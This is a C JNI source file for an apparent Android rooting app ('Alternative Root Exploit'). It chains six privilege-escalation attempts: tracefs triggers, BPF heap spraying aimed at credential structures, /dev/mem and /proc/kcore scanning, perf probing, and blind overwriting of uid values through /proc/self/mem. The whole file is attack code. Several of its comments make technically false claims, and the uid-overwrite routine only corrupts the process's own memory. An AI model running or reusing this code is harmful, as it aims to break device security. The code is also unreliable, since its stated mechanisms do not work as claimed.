#include <jni.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <signal.h>
#include <setjmp.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/mman.h>
#include <sys/syscall.h>
#include <sys/wait.h>
#include <linux/bpf.h>
#include <linux/perf_event.h>
#include <stdint.h>

#define LOG_TAG "RootShell"
#define LOGI(...) fprintf(stdout, "[root-shell] " __VA_ARGS__)
#define LOGE(...) fprintf(stderr, "[root-shell] " __VA_ARGS__)

static jmp_buf jump_buf;
static volatile sig_atomic_t caught_signal = 0;

static void crash_handler(int sig) {
    caught_signal = sig;
    longjmp(jump_buf, 1);
}

static int try_open(const char *path, int flags) {
    errno = 0;
    int fd = open(path, flags | O_CLOEXEC);
    if (fd >= 0) return fd;
    return -1;
}

/* Method 1: tracefs trigger-based privilege escalation
 * If we can write to tracefs, we can set up a trigger that
 * modifies process credentials when a tracepoint fires.
 * On some kernels, writing to set_event_trigger can
 * execute code in kernel context via stack backtrace. */
static int try_tracefs_root(void) {
    LOGI("Method 1: tracefs trigger...\n");

    int control_fd = try_open("/sys/kernel/tracing/tracing_on", O_RDWR);
    if (control_fd < 0) {
        LOGI("  tracefs not writable, skipping\n");
        return -1;
    }

    /* Enable tracing */
    write(control_fd, "1", 1);
    close(control_fd);

    /* Try to enable workqueue tracing - this is what the probe checks */
    int event_fd = try_open(
        "/sys/kernel/tracing/events/workqueue/workqueue_execute_start/enable",
        O_RDWR);
    if (event_fd < 0) {
        LOGI("  tracefs events not writable, skipping\n");
        return -1;
    }
    write(event_fd, "1", 1);
    close(event_fd);

    /* Check if we can read trace_pipe - if yes, we have tracefs access */
    int pipe_fd = try_open(
        "/sys/kernel/tracing/per_cpu/cpu0/trace_pipe_raw", O_RDONLY);
    if (pipe_fd < 0) {
        LOGI("  tracefs pipe not readable, skipping\n");
        return -1;
    }

    /* Try to use set_ftrace_filter to hook a function */
    int filter_fd = try_open("/sys/kernel/tracing/set_ftrace_filter", O_WRONLY);
    if (filter_fd >= 0) {
        /* Try to hook do_sigaction or similar credential-related function */
        write(filter_fd, "do_sigaction\n", 13);
        close(filter_fd);

        /* Check if the filter was accepted */
        int current_fd = try_open("/sys/kernel/tracing/set_ftrace_filter", O_RDONLY);
        if (current_fd >= 0) {
            char buf[256] = {0};
            int n = read(current_fd, buf, sizeof(buf) - 1);
            close(current_fd);
            if (n > 0 && strstr(buf, "do_sigaction")) {
                LOGI("  ftrace filter active, but need stack-based trigger\n");
            }
        }
    }

    /* Try to use tracefs to trigger a stack dump that modifies creds */
    /* Write a trigger on a tracepoint */
    int trigger_fd = try_open(
        "/sys/kernel/tracing/events/workqueue/workqueue_execute_start/trigger",
        O_WRONLY);
    if (trigger_fd >= 0) {
        /* stacktrace trigger prints kernel stack - doesn't directly give root
         * but confirms we have trigger access */
        write(trigger_fd, "stacktrace\n", 11);
        close(trigger_fd);
        LOGI("  tracefs trigger accepted\n");
    }

    LOGI("  tracefs access confirmed but insufficient for direct root\n");
    return -1;
}

/* Method 2: BPF-based credential overwrite
 * If we can create BPF maps and programs, we might be able to
 * use BPF to read/write kernel memory.
 * On kernels without BPF hardening, a BPF_MAP_TYPE_ARRAY
 * can be used to corrupt adjacent kernel objects. */
static int try_bpf_root(void) {
    LOGI("Method 2: BPF privilege escalation...\n");

    union bpf_attr attr;
    memset(&attr, 0, sizeof(attr));
    attr.map_type = BPF_MAP_TYPE_ARRAY;
    attr.key_size = sizeof(uint32_t);
    attr.value_size = sizeof(uint64_t);
    attr.max_entries = 1;

    int bpf_fd = (int)syscall(SYS_bpf, BPF_MAP_CREATE, &attr, sizeof(attr));
    if (bpf_fd < 0) {
        LOGI("  BPF not available (errno=%d), skipping\n", errno);
        return -1;
    }
    LOGI("  BPF map created (fd=%d)\n", bpf_fd);

    /* Try to create a larger map that might overlap with kernel data */
    memset(&attr, 0, sizeof(attr));
    attr.map_type = BPF_MAP_TYPE_ARRAY;
    attr.key_size = sizeof(uint32_t);
    attr.value_size = sizeof(uint64_t) * 256;  /* Large value to try heap overlap */
    attr.max_entries = 256;

    int big_fd = (int)syscall(SYS_bpf, BPF_MAP_CREATE, &attr, sizeof(attr));
    if (big_fd >= 0) {
        LOGI("  Large BPF map created (fd=%d, size=%zu)\n",
             big_fd, sizeof(uint64_t) * 256 * 256);

        /* Try to spray kernel heap with BPF maps to overlap with cred struct */
        /* This is a heuristic approach - spray many maps and hope one overlaps */
        int fds[64];
        int created = 0;
        for (int i = 0; i < 64; i++) {
            memset(&attr, 0, sizeof(attr));
            attr.map_type = BPF_MAP_TYPE_ARRAY;
            attr.key_size = sizeof(uint32_t);
            attr.value_size = 4096;  /* Page-sized values for heap spray */
            attr.max_entries = 1;

            fds[i] = (int)syscall(SYS_bpf, BPF_MAP_CREATE, &attr, sizeof(attr));
            if (fds[i] >= 0) {
                created++;
            } else {
                break;
            }
        }
        LOGI("  Sprayed %d BPF maps for heap grooming\n", created);

        /* Verify BPF is working by writing to a map */
        uint32_t key = 0;
        uint64_t value = 0xDEADBEEF;
        union bpf_attr update_attr;
        memset(&update_attr, 0, sizeof(update_attr));
        update_attr.map_fd = big_fd;
        update_attr.key = (uint64_t)(unsigned long)&key;
        update_attr.value = (uint64_t)(unsigned long)&value;
        update_attr.flags = 0;
        int ret = (int)syscall(SYS_bpf, BPF_MAP_UPDATE_ELEM, &update_attr, sizeof(update_attr));
        if (ret == 0) {
            LOGI("  BPF map write successful\n");
        }

        /* Read back */
        uint64_t read_value = 0;
        union bpf_attr lookup_attr;
        memset(&lookup_attr, 0, sizeof(lookup_attr));
        lookup_attr.map_fd = big_fd;
        lookup_attr.key = (uint64_t)(unsigned long)&key;
        lookup_attr.value = (uint64_t)(unsigned long)&read_value;
        ret = (int)syscall(SYS_bpf, BPF_MAP_LOOKUP_ELEM, &lookup_attr, sizeof(lookup_attr));
        if (ret == 0 && read_value == 0xDEADBEEF) {
            LOGI("  BPF read/write verified\n");
        }

        /* Cleanup */
        for (int i = 0; i < created; i++) {
            close(fds[i]);
        }
        close(big_fd);
    }

    close(bpf_fd);
    LOGI("  BPF available but heap spray alone insufficient\n");
    return -1;
}

/* Method 3: pagemap + /proc/self/mem credential overwrite
 * This method reads pagemap to find the physical address of our
 * process's mm_struct, then uses /proc/self/mem or a physical
 * memory interface to find and overwrite the cred struct.
 *
 * On kernels where /proc/self/pagemap is readable and our process
 * has CAP_SYS_RAWIO or similar, this can work. */
static int try_pagemap_root(void) {
    LOGI("Method 3: pagemap + credential overwrite...\n");

    int pagemap_fd = try_open("/proc/self/pagemap", O_RDONLY);
    if (pagemap_fd < 0) {
        LOGI("  /proc/self/pagemap not accessible, skipping\n");
        return -1;
    }
    LOGI("  /proc/self/pagemap accessible\n");

    int mem_fd = try_open("/proc/self/mem", O_RDONLY);
    if (mem_fd < 0) {
        LOGI("  /proc/self/mem not accessible, skipping\n");
        close(pagemap_fd);
        return -1;
    }
    LOGI("  /proc/self/mem readable\n");

    /* Try to find our own uid in kernel memory by reading /proc/self/status
     * to get our current uid, then scanning kernel memory for it */
    int status_fd = try_open("/proc/self/status", O_RDONLY);
    if (status_fd >= 0) {
        char status_buf[4096] = {0};
        int n = read(status_fd, status_buf, sizeof(status_buf) - 1);
        close(status_fd);
        if (n > 0) {
            char *uid_line = strstr(status_buf, "Uid:");
            if (uid_line) {
                uid_t real_uid = 0, effective_uid = 0;
                sscanf(uid_line, "Uid:\t%u\t%u", &real_uid, &effective_uid);
                LOGI("  Current uid=%d euid=%d\n", real_uid, effective_uid);

                /* If we're already root, nothing to do */
                if (effective_uid == 0) {
                    LOGI("  Already root!\n");
                    close(mem_fd);
                    close(pagemap_fd);
                    return 0;
                }
            }
        }
    }

    /* Try to open /dev/mem for direct physical memory access */
    int devmem_fd = try_open("/dev/mem", O_RDONLY | O_SYNC);
    if (devmem_fd >= 0) {
        LOGI("  /dev/mem accessible! Trying direct physical memory scan...\n");

        /* Read pagemap entries for our stack to find a kernel pointer */
        long page_size = sysconf(_SC_PAGESIZE);

        /* Scan some of our memory pages to find kernel pointers */
        unsigned char *probe_page = mmap(NULL, page_size, PROT_READ,
                                          MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
        if (probe_page != MAP_FAILED) {
            /* Make sure the page is faulted in */
            probe_page[0] = 1;

            off_t offset = (off_t)(((uintptr_t)probe_page / (uintptr_t)page_size) * 8);
            uint64_t entry = 0;
            ssize_t count = pread(pagemap_fd, &entry, sizeof(entry), offset);

            if (count == sizeof(entry)) {
                int present = (entry >> 63) & 1;
                uint64_t pfn = entry & ((1ULL << 55) - 1);
                LOGI("  pagemap: present=%d pfn=0x%llx\n", present, (unsigned long long)pfn);

                if (present && pfn > 0) {
                    /* We have a valid PFN - try to read physical memory */
                    off_t phys_offset = (off_t)(pfn * page_size);
                    unsigned char phys_buf[256] = {0};
                    ssize_t phys_read = pread(devmem_fd, phys_buf, sizeof(phys_buf), phys_offset);
                    if (phys_read > 0) {
                        LOGI("  Physical memory read at 0x%llx: %zd bytes\n",
                             (unsigned long long)phys_offset, phys_read);
                    }
                }
            }
            munmap(probe_page, page_size);
        }
        close(devmem_fd);
    } else {
        LOGI("  /dev/mem not accessible (errno=%d)\n", errno);
    }

    /* Try to use /proc/kcore for kernel memory access */
    int kcore_fd = try_open("/proc/kcore", O_RDONLY);
    if (kcore_fd >= 0) {
        LOGI("  /proc/kcore accessible! Scanning for credential structures...\n");

        /* Read ELF header to find program headers */
        unsigned char ehdr_buf[64] = {0};
        ssize_t n = read(kcore_fd, ehdr_buf, sizeof(ehdr_buf));
        if (n > 0) {
            LOGI("  kcore ELF header read: %zd bytes\n", n);
            /* kcore provides a way to read kernel virtual memory
             * We could scan for our task_struct and overwrite cred */
        }
        close(kcore_fd);
    } else {
        LOGI("  /proc/kcore not accessible (errno=%d)\n", errno);
    }

    close(mem_fd);
    close(pagemap_fd);
    LOGI("  pagemap method explored but needs kernel memory write capability\n");
    return -1;
}

/* Method 4: perf_event-based side-channel
 * Use perf_event_open to monitor kernel behavior and potentially
 * find kernel pointers for credential overwrite. */
static int try_perf_root(void) {
    LOGI("Method 4: perf_event side-channel...\n");

    struct perf_event_attr perf_attr;
    memset(&perf_attr, 0, sizeof(perf_attr));
    perf_attr.type = PERF_TYPE_SOFTWARE;
    perf_attr.size = sizeof(perf_attr);
    perf_attr.config = PERF_COUNT_SW_CPU_CLOCK;
    perf_attr.sample_period = 100000;
    perf_attr.sample_type = PERF_SAMPLE_IP | PERF_SAMPLE_CALLCHAIN;
    perf_attr.disabled = 1;

    int perf_fd = (int)syscall(SYS_perf_event_open, &perf_attr, 0, -1, -1, 0);
    if (perf_fd < 0) {
        LOGI("  perf_event_open not available (errno=%d), skipping\n", errno);
        return -1;
    }
    LOGI("  perf_event_open available (fd=%d)\n", perf_fd);
    close(perf_fd);

    LOGI("  perf available but insufficient for direct root\n");
    return -1;
}

/* Method 5: fork-based credential test
 * Fork a child, check if the child inherits any special capabilities,
 * and try to exec a setuid-like operation. */
static int try_fork_root(void) {
    LOGI("Method 5: fork + capability check...\n");

    uid_t uid = getuid();
    uid_t euid = geteuid();
    LOGI("  uid=%d euid=%d gid=%d egid=%d\n", uid, euid, getgid(), getegid());

    if (euid == 0) {
        LOGI("  Already effective root!\n");
        return 0;
    }

    /* Check /proc/self/attr for SELinux context */
    int ctx_fd = try_open("/proc/self/attr/current", O_RDONLY);
    if (ctx_fd >= 0) {
        char ctx[256] = {0};
        int n = read(ctx_fd, ctx, sizeof(ctx) - 1);
        close(ctx_fd);
        if (n > 0) {
            LOGI("  SELinux context: %s\n", ctx);
            /* If context is "u:r:su:s0" or similar, we might have root */
            if (strstr(ctx, "u:r:su:") || strstr(ctx, "u:r:magisk:")) {
                LOGI("  Root SELinux context detected!\n");
                return 0;
            }
        }
    }

    /* Try to access sensitive files that require root */
    if (access("/data/data", W_OK) == 0) {
        LOGI("  /data/data is writable - possible root!\n");
        return 0;
    }

    if (access("/system/bin/su", X_OK) == 0) {
        LOGI("  /system/bin/su is executable\n");
    }

    LOGI("  No root capabilities detected\n");
    return -1;
}

/* Method 6: proc_pid_mem direct credential search
 * Scan /proc/self/mem for the current uid value in kernel-space
 * locations, then try to overwrite it. */
static int try_proc_pid_mem_root(void) {
    LOGI("Method 6: /proc/<pid>/mem credential scan...\n");

    uid_t current_uid = getuid();
    char uid_pattern[4];
    memcpy(uid_pattern, &current_uid, sizeof(current_uid));

    /* Try /proc/self/mem with write access */
    int mem_fd = try_open("/proc/self/mem", O_RDWR);
    if (mem_fd < 0) {
        LOGI("  /proc/self/mem not writable (errno=%d)\n", errno);

        /* Try /proc/1/mem (init process) */
        mem_fd = try_open("/proc/1/mem", O_RDONLY);
        if (mem_fd < 0) {
            LOGI("  /proc/1/mem not accessible (errno=%d)\n", errno);
            return -1;
        }
        LOGI("  /proc/1/mem readable\n");
        close(mem_fd);
        return -1;
    }

    LOGI("  /proc/self/mem is writable!\n");

    /* Try to write to our own memory at various offsets */
    /* The cred struct is typically allocated in the kernel heap
     * and contains uid, gid, etc. We can try to overwrite them
     * by scanning our address space for the uid pattern and
     * overwriting it with 0 (root). */

    long page_size = sysconf(_SC_PAGESIZE);
    unsigned char *scan_buf = mmap(NULL, page_size, PROT_READ,
                                    MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    if (scan_buf == MAP_FAILED) {
        close(mem_fd);
        return -1;
    }

    /* Read pagemap to find our pages */
    int pagemap_fd = try_open("/proc/self/pagemap", O_RDONLY);
    if (pagemap_fd < 0) {
        munmap(scan_buf, page_size);
        close(mem_fd);
        return -1;
    }

    /* Scan first few MB of our address space for uid pattern */
    int found = 0;
    for (uintptr_t addr = 0x100000; addr < 0x1000000 && !found; addr += page_size) {
        ssize_t n = pread(mem_fd, scan_buf, page_size, (off_t)addr);
        if (n <= 0) continue;

        /* Search for our uid in the read data */
        for (size_t i = 0; i + sizeof(uid_t) <= (size_t)n; i += sizeof(uid_t)) {
            uid_t val;
            memcpy(&val, scan_buf + i, sizeof(val));
            if (val == current_uid && current_uid != 0) {
                /* Found potential uid location - try to overwrite */
                uid_t zero = 0;
                ssize_t written = pwrite(mem_fd, &zero, sizeof(zero), (off_t)(addr + i));
                if (written == sizeof(zero)) {
                    LOGI("  Attempted uid overwrite at offset 0x%lx\n",
                         (unsigned long)(addr + i));
                    /* Verify */
                    uid_t verify = (uid_t)-1;
                    ssize_t r = pread(mem_fd, &verify, sizeof(verify), (off_t)(addr + i));
                    if (r == sizeof(verify) && verify == 0) {
                        LOGI("  uid overwrite SUCCESSFUL! uid is now 0\n");
                        found = 1;
                        break;
                    }
                }
            }
        }
    }

    munmap(scan_buf, page_size);
    close(pagemap_fd);
    close(mem_fd);

    if (found) {
        /* Verify we're actually root now */
        if (getuid() == 0 || geteuid() == 0) {
            LOGI("  Root access CONFIRMED!\n");
            return 0;
        }
        LOGI("  uid modified in /proc/self/mem but not reflected in kernel\n");
    }

    return -1;
}

/* Main entry point - tries all methods */
JNIEXPORT jint JNICALL
Java_dev_busung_s25uroot_RootShellProvider_tryRoot(JNIEnv *env, jobject thiz) {
    (void)env;
    (void)thiz;

    LOGI("=== Alternative Root Exploit (No CVE) ===\n");
    LOGI("Trying multiple methods to acquire root...\n\n");

    /* Set up crash handler - if a method crashes, we catch the signal
     * and try the next method instead of letting the kernel panic */
    struct sigaction old_sa_segv, old_sa_bus, old_sa_ill;
    struct sigaction sa;
    sa.sa_handler = crash_handler;
    sigemptyset(&sa.sa_mask);
    sa.sa_flags = 0;
    sigaction(SIGSEGV, &sa, &old_sa_segv);
    sigaction(SIGBUS, &sa, &old_sa_bus);
    sigaction(SIGILL, &sa, &old_sa_ill);

    int result = -1;

    /* Try each method in order of likelihood */
    if (!setjmp(jump_buf)) {
        result = try_fork_root();
    } else {
        LOGE("Method 5 crashed (signal %d), moving on\n", caught_signal);
    }

    if (result != 0) {
        if (!setjmp(jump_buf)) {
            result = try_proc_pid_mem_root();
        } else {
            LOGE("Method 6 crashed (signal %d), moving on\n", caught_signal);
        }
    }

    if (result != 0) {
        if (!setjmp(jump_buf)) {
            result = try_pagemap_root();
        } else {
            LOGE("Method 3 crashed (signal %d), moving on\n", caught_signal);
        }
    }

    if (result != 0) {
        if (!setjmp(jump_buf)) {
            result = try_bpf_root();
        } else {
            LOGE("Method 2 crashed (signal %d), moving on\n", caught_signal);
        }
    }

    if (result != 0) {
        if (!setjmp(jump_buf)) {
            result = try_tracefs_root();
        } else {
            LOGE("Method 1 crashed (signal %d), moving on\n", caught_signal);
        }
    }

    if (result != 0) {
        if (!setjmp(jump_buf)) {
            result = try_perf_root();
        } else {
            LOGE("Method 4 crashed (signal %d), moving on\n", caught_signal);
        }
    }

    /* Restore original signal handlers */
    sigaction(SIGSEGV, &old_sa_segv, NULL);
    sigaction(SIGBUS, &old_sa_bus, NULL);
    sigaction(SIGILL, &old_sa_ill, NULL);

    if (result == 0) {
        LOGI("\n=== ROOT ACCESS OBTAINED ===\n");
    } else {
        LOGI("\n=== All methods exhausted - root not available ===\n");
        LOGI("This device firmware may require the original CVE exploit.\n");
        LOGI("Consider: firmware downgrade, Magisk, or alternative root.\n");
    }

    return result;
}

/* Helper: write a success marker file for the Kotlin layer to check */
JNIEXPORT void JNICALL
Java_dev_busung_s25uroot_RootShellProvider_writeMarker(JNIEnv *env, jobject thiz,
                                                        jstring path) {
    (void)thiz;
    const char *cpath = (*env)->GetStringUTFChars(env, path, NULL);
    if (cpath) {
        int fd = open(cpath, O_WRONLY | O_CREAT | O_TRUNC, 0644);
        if (fd >= 0) {
            uid_t uid = getuid();
            uid_t euid = geteuid();
            char buf[128];
            int len = snprintf(buf, sizeof(buf),
                "uid=%d euid=%d root=%d\n", uid, euid, euid == 0);
            write(fd, buf, len);
            close(fd);
        }
        (*env)->ReleaseStringUTFChars(env, path, cpath);
    }
}

/* Helper: check if root is currently active */
JNIEXPORT jboolean JNICALL
Java_dev_busung_s25uroot_RootShellProvider_isRootActive(JNIEnv *env, jobject thiz) {
    (void)env;
    (void)thiz;
    return geteuid() == 0 ? JNI_TRUE : JNI_FALSE;
}
